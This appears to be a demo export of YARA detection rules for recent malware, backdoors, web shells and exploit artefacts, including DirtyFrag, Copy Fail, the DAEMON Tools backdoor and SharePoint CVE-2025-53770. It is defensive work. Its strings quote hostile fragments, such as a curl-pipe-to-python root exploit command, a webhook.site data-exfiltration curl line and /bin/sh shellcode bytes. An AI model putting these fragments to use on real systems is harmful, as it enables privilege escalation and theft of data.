/*
    VALHALLA YARA RULE SET - DEMO
    Retrieved: 2026-06-27 20:50
    Generated for User: demo
    Number of Rules: 2797
    Warning:
        Note that the full rule set contains rules that require modules and threat hunting
        rules with low scores (< 60) that could lead to false positives - use the Python
        module valhallaAPI to retrieve a filtered set

    This is the VALHALLA demo rule set. The content represents the 'signature-base' repository
    in a streamlined format but lacks the rules provided by 3rd parties.
    All rules are licensed under CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/.
*/

import "pe"

rule MAL_APT_Nimbus_Manticore_Stager_May26_RID34B0 : APT DEMO EXE FILE MAL T1053_005 {
   meta:
      description = "Detects .NET based stager using AppDomain Hijacking observed to be used by Nimbus Manticore (UNC1549). The stager drops another payload and establishes persistence via scheduled task."
      author = "Jonathan Peters (cod3nym)"
      reference = "https://www.nextron-systems.com/2026/06/01/detecting-nimbus-manticore-and-their-sideloading-infection-chains"
      date = "2026-05-20 15:41:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE, MAL, T1053_005"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "MyCompany-Product-TOTP-Salt-2024!@#$" wide fullword
      $x2 = "TOTPGuardRunner" ascii fullword
      $x3 = "\\AppDomainInjection-metlifeScenario\\TOTP" ascii
      $sa1 = "EncData" ascii fullword
      $sa2 = "DecryptAndSaveToDesktop" ascii fullword
      $sa3 = "CopyHelloToDesktop" ascii fullword
      $sb1 = "doit" wide fullword
      $sb2 = "DailyTrigger" wide fullword
      $sb3 = "GetTypeFromCLSID" ascii
      $sb4 = "yyyy-MM-ddTHH:mm:ss" wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or all of ( $sa* ) or all of ( $sb* ) )
}

rule EXPL_LNX_DirtyFrag_ForensicArtefacts_May26_RID36A9 : DEMO EXPLOIT LINUX {
   meta:
      description = "Detects DirtyFrag exploit code POC usage in Linux environments"
      author = "Florian Roth"
      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
      date = "2026-05-08 17:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $xa1 = "/V4bel/dirtyfrag.git" ascii
      $xa2 = "static const uint8_t shell_elf[PAYLOAD_LEN] = {" ascii
      $xa3 = "/usr/bin/su page-cache patched (entry 0x%x = shellcode)" ascii
   condition: 
      filesize < 800KB and 1 of ( $xa* )
}

rule EXPL_LNX_DirtyFragLPE_May26_RID3055 : DEMO EXPLOIT FILE LINUX T1068 {
   meta:
      description = "Detects dirtyfrag, a local privilege escalation exploit for Linux."
      author = "Pezier Pierre-Henri"
      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
      date = "2026-05-07 12:35:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, FILE, LINUX, T1068"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "gained CAP_NET_RAW within netn" ascii
      $x2 = "DIRTYFRAG_VERBOSE" ascii
      $s1 = { 15 7C 4A 7F B9 79 37 9E } 
      $s2 = "/proc/self/setgroups" ascii fullword
      $s3 = "pcbc(fcrypt)" ascii fullword
      $s4 = { 17 bb c7 f3 3f 36 ba 71 8e 97 65 60 69 b6 f6 e6 } 
   condition: 
      filesize < 100KB and uint32be ( 0 ) == 0x7f454c46 and ( 1 of ( $x* ) or 3 of ( $s* ) )
}

rule EXPL_HKTL_LNX_DirtyFragShellcode_May26_RID3499 : DEMO EXPLOIT HKTL LINUX T1068 {
   meta:
      description = "Detects a shellcode observed in dirtyfrag, a local privilege escalation exploit for Linux."
      author = "Pezier Pierre-Henri"
      reference = "https://github.com/V4bel/dirtyfrag/tree/master"
      date = "2026-05-07 15:37:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, HKTL, LINUX, T1068"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 31 ff 31 f6 31 c0 b0 6a 0f 05 b0 69 0f 05 b0 74 0f 05 6a 00 48 [6] 50 48 89 e2 48 [6] 31 f6 6a 3b 58 0f 05 } 
   condition: 
      $op1
}

rule MAL_DAEMON_Tools_Lite_Compromised_May26_RID352A : DEMO EXE FILE MAL T1020 {
   meta:
      description = "Detects compromised DAEMON Tools Lite versions deployed in a supplychain compromise campaign affected versions include: 12.5.0.2421 up to 12.5.0.2434 The infected binaries drop Quic RAT and various custom data exfiltration payloads."
      author = "Jonathan Peters (cod3nym)"
      reference = "https://securelist.com/tr/daemon-tools-backdoor/119654/"
      date = "2026-05-05 16:01:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, MAL, T1020"
      minimum_yara = "3.5.0"
      
   strings:
      $sa1 = { 31 03 35 55 e4 c4 32 2d a9 e0 b3 81 6d 14 38 4e } 
      $sa2 = "AVB Disc Soft, SIA" ascii
      $sa3 = "DAEMON Tools Lite" ascii wide
      $re = /12\.5\.0\.24(21|22|23|24|25|26|27|28|29|30|31|33|34)/ ascii wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of ( $sa* ) and $re
}

rule MAL_Backdoor_May26_RID2D5D : DEMO MAL SCRIPT {
   meta:
      description = "Detects a backdoor smuggled into signed DAEMON Tools binaries via supply-chain compromise, receives encrypted commands over HTTPS to execute arbitrary shell commands and drop files on victim hosts."
      author = "MalGamy"
      reference = "https://securelist.com/tr/daemon-tools-backdoor/119654/"
      date = "2026-05-05 10:28:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 48 8D 8D ?? ?? ?? ?? C7 45 ?? ?? ?? ?? ?? C7 45 ?? ?? ?? ?? ?? F3 0F 7F 7D ?? C7 45 ?? ?? ?? ?? ?? F3 0F 7F 75 ?? C7 45 ?? ?? ?? ?? ?? C7 45 ?? ?? ?? ?? ?? 66 C7 45 ?? ?? ?? C6 45 ?? ?? FF 15 ?? ?? ?? ?? 48 8D 15 ?? ?? ?? ?? 48 8D 8D ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 48 8D 95 } 
      $op2 = { 4D 8D 40 ?? 99 41 FF C1 41 F7 FB 48 63 C2 0F B6 8C 05 ?? ?? ?? ?? 41 30 48 ?? 49 83 EA } 
   condition: 
      all of them
}

rule MAL_Minimalistic_Backdoor_May26_RID329F : DEMO EXE FILE MAL {
   meta:
      description = "Detects minimalistic backdoor deployment where a shellcode loader downloads an encrypted payload and executes it in memory after RC4 decryption using a command-line provided key"
      author = "MalGamy"
      reference = "https://securelist.com/tr/daemon-tools-backdoor/119654/"
      date = "2026-05-05 14:13:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Note: if multiple processes load the DLL," wide
      $x2 = "Inject (shellcode file is RC4 ciphertext; key is a UTF-8 string" wide
      $s1 = "Error: VirtualAllocEx failed, Win" wide
      $s2 = "Try running as administrator; " wide
      $s3 = ", shellcode size: " wide
      $s4 = "input file path cannot be empty." wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( 1 of ( $x* ) or all of ( $s* ) )
}

rule EXPL_LNX_Copy_Fail_Artefacts_CVE_2026_31431_Apr26_RID3717 : CVE_2026_31431 DEMO EXPLOIT LINUX SCRIPT T1059_006 T1087_001 {
   meta:
      description = "Detects forensic artifacts related to public Copy Fail (CVE-2026-31431) exploit PoCs, including known tiny ELF shell payloads, Python exploit code fragments, AF_ALG/authencesn/splice usage patterns, public PoC URLs, and other indicators observed in online proof-of-concept material."
      author = "Florian Roth"
      reference = "https://copy.fail"
      date = "2026-04-30 17:23:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2026_31431, DEMO, EXPLOIT, LINUX, SCRIPT, T1059_006, T1087_001"
      minimum_yara = "4.0.0"
      
   strings:
      $xn1 = "curl https://copy.fail/exp" ascii
      $xs1 = "| python3 && su" 
      $xs2 = "g.open(\"/usr/bin/su\",0);i=0;" 
      $xs3 = "[-] page-cache mutation failed" 
      $xs4 = "[+] /etc/passwd page cache mutated" 
      $xs5 = "bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))" 
      $xs6 = "/tmp/.cve_test" 
      $sa1 = "authencesn(hmac(sha256),cbc(aes))" ascii
      $sb1 = { 08 00 01 00 00 00 00 10 } 
      $sb2 = "0800010000000010" ascii
      $xe1 = "authencesn(hmac(sha256),cbc(aes))" base64
      $xc1 = { 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 78 00 40 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 40 00 00 00 00 00 00 9e 00 00 00 00 00 00 00 9e 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 31 c0 31 ff b0 69 0f 05 48 8d 3d 0f 00 00 00 31 f6 6a 3b 58 99 0f 05 31 ff 6a 3c 58 0f 05 2f 62 69 6e 2f 73 68 00 00 00 } 
      $xc2 = { 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 b7 00 01 00 00 00 78 00 40 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 ac 00 00 00 00 00 00 00 ac 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 80 d2 48 12 80 d2 01 00 00 d4 00 01 00 10 01 00 80 d2 02 00 80 d2 a8 1b 80 d2 01 00 00 d4 00 00 80 d2 a8 0b 80 d2 01 00 00 d4 2f 62 69 6e 2f 73 68 00 } 
      $xg1 = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3" 
      $xg2 = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858" 
      $xg3 = "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578" 
      $xg4 = "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf" 
      $xg5 = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180" 
      $xg6 = "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509" 
      $xge1 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 06 3b 06 10 af 82 c1 01 cc 77 60 c0 04 0e 0c 16 0c 30 1d 20 9a 15 4d 16 99 9e 07 e5 c1 68 06 01 08 65 78 c0 f0 ff 86 4c 7e 56 8f 5e 5b 7e 10 f7 5b 96 75 c4 4c 7e 56 c3 ff 59 36 11 fc ac fa 49 99 79 fa c5 19 0c 00 11 1d 10 d3 } 
      $xge2 = { 78 9c ab 77 f5 71 63 64 64 64 80 01 26 06 66 06 10 2f a4 81 85 c3 84 01 01 4c 18 14 18 60 aa e0 aa 81 6a 40 b8 06 c8 04 61 56 90 98 00 03 83 e1 01 c3 db 1b ae 9e 6d 30 3c 10 90 a1 af 5f 9c 91 a1 9f 94 99 d7 f9 38 20 b8 f3 61 e7 a1 0d dc 40 89 db 59 8c 11 67 1b 00 38 b3 18 58 } 
      $xge3 = { 78 da ab 77 f5 71 63 62 64 64 80 01 26 86 ed 0c 20 5e 05 83 03 98 ef c0 80 09 1c 18 2c 18 60 3a 40 34 2b 9a 2c 32 bd 06 ca 5b 03 97 87 e9 6c b8 e4 21 d4 70 09 c8 bb 02 14 12 60 04 f2 99 80 78 85 34 54 0c c4 e6 86 b0 f5 93 32 f3 f4 8b 33 18 00 3f f6 15 78 } 
      $xge4 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 06 3b 06 10 af 82 c1 01 cc 77 60 c0 04 0e 0c 16 0c 30 1d 20 9a 15 4d 16 99 9e 02 e5 c1 68 06 01 08 65 78 c0 f0 ff 86 4c 7e 56 8f ee 1a 15 01 c3 6f 59 d6 11 33 f9 59 0d ff 67 d9 44 f0 b3 02 00 82 b0 0e af } 
      $xge5 = { 78 9c ab 77 f5 71 63 64 64 64 80 01 26 06 66 06 10 2f a4 81 85 c3 84 01 01 4c 18 14 18 60 aa e0 aa 81 6a 40 38 1f c8 04 61 56 90 98 00 03 83 e1 01 c3 db 1b ae 9e 6d e8 8e 51 e1 30 3c 99 c5 1d 31 f3 6c 83 e1 ed 2c c6 88 b3 0d 00 1b f4 11 80 } 
      $xge6 = { 78 9c ab 77 f5 71 63 62 64 64 80 01 26 86 ed 0c 20 5e 05 83 03 98 ef c0 80 09 1c 18 2c 18 60 3a 40 34 2b 9a 2c 32 bd 04 ca 5b 02 97 87 e9 6c b8 e4 21 d4 70 09 c8 bb f2 80 db e1 27 23 90 cf 04 c4 2b a4 21 62 20 f9 15 dc 10 36 00 d7 2b 15 09 } 
   condition: 
      1 of ( $x* ) or ( $sa1 and 1 of ( $sb* ) )
}

rule MAL_Chrysalis_DllLoader_Feb26_RID31A2 : CHINA Chrysalis DEMO EXE FILE G0030 MAL {
   meta:
      description = "Detects DLL used to load Chrysalis backdoor, seen being used in the compromise of the infrastructure hosting Notepad++ by Chinese APT group Lotus Blossom"
      author = "X__Junior"
      reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
      date = "2026-02-02 13:30:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, Chrysalis, DEMO, EXE, FILE, G0030, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 33 D2 8B C1 F7 F6 0F B6 C1 03 55 ?? 6B C0 ?? 32 02 88 04 0F 41 83 F9 ?? 72 } 
      $op2 = { 0F B6 04 31 41 33 C2 69 D0 ?? ?? ?? ?? 3B CB 72 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
}

rule MAL_Chrysalis_Shellcode_Loader_Feb26_RID3478 : CHINA Chrysalis DEMO G0030 MAL {
   meta:
      description = "Detects shellcode used to load Chrysalis backdoor, seen being used in the compromise of the infrastructure hosting Notepad++ by Chinese APT group Lotus Blossom"
      author = "X__Junior"
      reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
      date = "2026-02-02 15:31:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, Chrysalis, DEMO, G0030, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 8B C7 03 D7 83 E0 ?? 47 8A 4C 05 ?? 8A 04 13 02 C1 32 C1 2A C1 88 02 8B 55 ?? 3B FE 7C ?? 8B 5D ?? 8B 45 } 
      $op2 = { 03 F8 8B 45 ?? 8B 50 ?? 85 C9 79 ?? 0F B7 C1 EB ?? 8D 41 ?? 03 C3 50 FF 75 ?? FF D2 89 07 85 C0 74 ?? 8B 4D ?? 46 } 
   condition: 
      1 of them
}

rule MAL_Chrysalis_Backdoor_Feb26_RID3154 : CHINA Chrysalis DEMO G0030 MAL {
   meta:
      description = "Detects Chrysalis backdoor, seen being used in the compromise of the infrastructure hosting Notepad++ by Chinese APT group Lotus Blossom"
      author = "X__Junior"
      reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
      date = "2026-02-02 13:17:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, Chrysalis, DEMO, G0030, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $opa1 = { 8B 4D ?? C1 CF ?? C1 C1 ?? 03 F9 D1 C3 8B 4D ?? C1 C1 ?? 03 F9 03 FB 8B 5D ?? 69 CF ?? ?? ?? ?? BF ?? ?? ?? ?? 2B F9 EB } 
      $opa2 = { F7 E9 [0-1] 8B C2 C1 E8 ?? 03 C2 8D 0C 40 8A C3 34 ?? [0-2] 0F B6 [1-4] 0F B6 C3 8B 5D [1-3] 0F 45 D0 } 
      $opb1 = { 0F B6 84 35 ?? ?? ?? ?? 88 84 3D ?? ?? ?? ?? 88 8C 35 ?? ?? ?? ?? 0F B6 84 3D ?? ?? ?? ?? 8B 8D ?? ?? ?? ?? 03 C2 0F B6 C0 0F B6 84 05 ?? ?? ?? ?? 30 04 19 43 3B 9D ?? ?? ?? ?? 7C } 
   condition: 
      ( 1 of ( $opa* ) and $opb1 ) or all of ( $opa* )
}

rule MAL_CobaltStrike_Beacon_Loader_Feb26_RID3442 : BEACON COBALTSTRIKE DEMO EXE FILE MAL S0154 T1550_002 {
   meta:
      description = "Detects Cobalt Strike beacon loader"
      author = "X__Junior"
      reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
      date = "2026-02-02 15:22:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "BEACON, COBALTSTRIKE, DEMO, EXE, FILE, MAL, S0154, T1550_002"
      minimum_yara = "3.5.0"
      
   strings:
      $opa1 = { 45 33 C9 41 B8 ?? ?? ?? ?? 48 8D 94 24 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 66 89 44 24 ?? 41 B8 ?? ?? ?? ?? 48 8D 94 24 ?? ?? ?? ?? 0F B7 4C 24 ?? FF 15 ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? FF 15 } 
      $opa2 = { 4C 8D 4C 24 ?? 41 B8 ?? ?? ?? ?? BA ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 48 C7 44 24 ?? ?? ?? ?? ?? C7 44 24 ?? ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8D 0D ?? ?? ?? ?? 45 33 C0 33 D2 48 8B C8 FF 15 } 
      $opb1 = { 48 8D 89 ?? ?? ?? ?? 0F 10 00 0F 10 48 ?? 48 8D 80 ?? ?? ?? ?? 0F 11 41 ?? 0F 10 40 ?? 0F 11 49 ?? 0F 10 48 ?? 0F 11 41 ?? 0F 10 40 ?? 0F 11 49 ?? 0F 10 48 ?? 0F 11 41 ?? 0F 10 40 ?? 0F 11 49 ?? 0F 10 48 ?? 0F 11 41 ?? 0F 11 49 ?? 48 83 EA } 
      $opb2 = { 45 33 C9 48 89 84 24 ?? ?? ?? ?? 41 B8 18 00 00 00 C7 84 24 ?? ?? ?? ?? 03 00 00 00 48 8D 94 24 ?? ?? ?? ?? 48 89 BC 24 ?? ?? ?? ?? B9 B9 00 00 00 FF 15 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of ( $opa* ) or all of ( $opb* )
}

rule MAL_Etoroloro_Malicious_NodePackage_Dec25_RID3677 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malicious component of node package named Etoroloro"
      author = "Pezier Pierre-Henri"
      reference = "Internal Research"
      date = "2025-12-12 16:57:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "DLLSideload." 
      $s2 = "Failed to expand path:" wide
      $op1 = { 41 0f af c0 48 8d 52 01 0f b6 c9 45 69 c0 35 d4 04 00 03 c1 0f b6 0a 84 c9 75 e5 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and ( all of ( $s* ) or $op1 )
}

rule EXPL_RCE_React_Server_Next_JS_CVE_2025_66478_Tracebacks_Dec25_RID3B98 : CVE_2025_55182 CVE_2025_66478 DEMO EXPLOIT T1059_007 {
   meta:
      description = "Detects traceback indicators caused by the exploitation of the React Server Remote Code Execution Vulnerability (CVE-2025-55182) in Next.js applications (CVE-2025-66478). This can also be caused by vulnerability scanning."
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2025-12-05 20:35:51"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2025_55182, CVE_2025_66478, DEMO, EXPLOIT, T1059_007"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Unexpected end of form" 
      $s2 = "/next-server/app-page.runtime.dev.js:2:457" 
      $s3 = "/app-page.runtime.dev.js:2:472" 
   condition: 
      all of them
}

rule EXPL_RCE_React_Server_Next_JS_CVE_2025_66478_Errors_Dec25_RID3A22 : CVE_2025_55182 CVE_2025_66478 DEMO EXPLOIT T1059_007 {
   meta:
      description = "Detects error messages caused by the exploitation of the React Server Remote Code Execution Vulnerability (CVE-2025-55182) in Next.js applications (CVE-2025-66478). This can also be caused by vulnerability scanning."
      author = "Florian Roth"
      reference = "https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478"
      date = "2025-12-05 19:33:31"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2025_55182, CVE_2025_66478, DEMO, EXPLOIT, T1059_007"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[Error: NEXT_REDIRECT]" 
      $s2 = "digest: 'uid=0(root) gid=0(root)" 
   condition: 
      all of them
}

rule MAL_JS_NPM_SupplyChain_Compromise_Sep25_RID356B : DEMO FILE MAL T1059_007 {
   meta:
      description = "Detects a supply chain compromise in NPM packages (TinyColor, CrowdStrike etc.)"
      author = "Florian Roth"
      reference = "https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages"
      date = "2025-09-16 16:12:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, MAL, T1059_007"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "if (plat === \"linux\") return \"https://github.com/trufflesecurity/trufflehog/releases" 
      $sa1 = "curl -d \"$CONTENTS\" https://webhook.site/" ascii
      $sa2 = "curl -s -X POST -d \"$CONTENTS\" \"https://webhook.site/" 
      $sb1 = " | base64 -w 0 | " ascii
      $sb2 = " | base64 -w0)" 
   condition: 
      filesize < 20MB and ( 1 of ( $x* ) or ( 1 of ( $sa* ) and 1 of ( $sb* ) ) ) and not uint8 ( 0 ) == 0x7b
}

rule MAL_Sindoor_Decryptor_Aug25_RID3126 : DEMO EXE FILE MAL {
   meta:
      description = "Detects AES decryptor used by Sindoor dropper related to APT 36"
      author = "Pezier Pierre-Henri"
      reference = "Internal Research"
      date = "2025-08-29 13:10:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Go build" 
      $s2 = "main.rc4EncryptDecrypt" 
      $s3 = "main.processFile" 
      $s4 = "main.deriveKeyAES" 
      $s5 = "use RC4 instead of AES" 
   condition: 
      filesize < 100MB and ( uint16 ( 0 ) == 0x5a4d or uint32be ( 0 ) == 0x7f454c46 or ( uint32be ( 0 ) == 0xcafebabe and uint32be ( 4 ) < 0x20 ) or uint32 ( 0 ) == 0xfeedface or uint32 ( 0 ) == 0xfeedfacf ) and all of them
}

rule MAL_Sindoor_Downloader_Aug25_RID3179 : DEMO EXE FILE MAL T1105 {
   meta:
      description = "Detects Sindoor downloader related to APT 36"
      author = "Pezier Pierre-Henri"
      reference = "Internal Research"
      date = "2025-08-29 13:24:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, MAL, T1105"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Go build" 
      $s2 = "main.downloadFile.deferwrap" 
      $s3 = "main.decrypt" 
      $s4 = "main.HiddenHome" 
      $s5 = "main.RealCheck" 
   condition: 
      filesize < 100MB and ( uint16 ( 0 ) == 0x5a4d or uint32be ( 0 ) == 0x7f454c46 or ( uint32be ( 0 ) == 0xcafebabe and uint32be ( 4 ) < 0x20 ) or uint32 ( 0 ) == 0xfeedface or uint32 ( 0 ) == 0xfeedfacf ) and all of them
}

rule MAL_LNX_PLAGUE_BACKDOOR_Jul25_RID2FEE : DEMO FILE LINUX MAL {
   meta:
      description = "Detects Plague backdoor ELF binaries, related to PAM authentication alteration."
      author = "Pezier Pierre-Henri"
      reference = "Internal Research"
      date = "2025-07-25 12:18:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-09-17"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "decrypt_phrase" 
      $s2 = "init_phrases" 
      $x1 = "captured_password" 
      $x2 = "updateklog" 
      $x3 = "init_cred_structs" 
      $xop1 = { 48 8b [4] 00 8b 00 3d ca b2 e9 f1 74 } 
   condition: 
      uint32be ( 0 ) == 0x7f454c46 and filesize < 1MB and 2 of them
}

rule WEBSHELL_ASPX_Sharepoint_Drop_CVE_2025_53770_Jul25_RID372D : CVE_2025_53770 DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects ASPX web shell dropped during the exploitation of SharePoint RCE vulnerability CVE-2025-53770"
      author = "Florian Roth"
      reference = "https://research.eye.security/sharepoint-under-siege/"
      date = "2025-07-20 17:27:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2025_53770, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "var sy = System.Reflection.Assembly.Load(" ascii
      $x2 = "Response.Write(cg.ValidationKey+" ascii
      $s1 = "<script runat=\"server\" language=\"c#\" CODEPAGE=\"65001\">" ascii fullword
   condition: 
      filesize < 4KB and 1 of ( $x* ) or all of them
}

rule WEBSHELL_ASPX_Compiled_Sharepoint_Drop_CVE_2025_53770_Jul25_2_RID3B4A : CVE_2025_53770 DEMO EXE SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects compiled ASPX web shell dropped during the exploitation of SharePoint RCE vulnerability CVE-2025-53770"
      author = "Florian Roth, Marius Benthin"
      reference = "https://research.eye.security/sharepoint-under-siege/"
      date = "2025-07-20 20:22:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-07-25"
      tags = "CVE_2025_53770, DEMO, EXE, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = /App_Web_spinstall\d{0,1}.aspx/ wide
      $x2 = /spinstall[\w]?[\._]aspx/ ascii
      $x3 = /\/_layouts\/1[0-9]\/spinstall/ wide
      $x4 = /\/_layouts\/1[0-9]\/ghostfile/ wide
      $s1 = "System.Web.Configuration.MachineKeySection" wide
      $s2 = "Page_load" ascii fullword
      $s3 = "GetApplicationConfig" wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or all of ( $s* ) ) or 2 of ( $x* ) or 4 of them
}

rule APT_EXPL_Sharepoint_CVE_2025_53770_ForensicArtefact_Jul25_1_RID3B17 : APT CVE_2025_53770 DEMO EXPLOIT {
   meta:
      description = "Detects URIs accessed during the exploitation of SharePoint RCE vulnerability CVE-2025-53770"
      author = "Florian Roth"
      reference = "https://research.eye.security/sharepoint-under-siege/"
      date = "2025-07-20 20:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2025-07-23"
      tags = "APT, CVE_2025_53770, DEMO, EXPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $sa1 = /POST \/_layouts\/1[0-9]\/ToolPane\.aspx/ ascii wide nocase
      $sa2 = "DisplayMode=Edit&a=/ToolPane.aspx" ascii wide
      $sb1 = /GET \/_layouts\/1[0-9]\/spinstall/ ascii wide
      $sb2 = "/_layouts/SignOut.aspx 200" ascii wide nocase
   condition: 
      ( @sa2 - @sa1 ) < 700 or ( @sb2 - @sb1 ) < 700 or ( @sb2 - @sa1 ) < 700
}

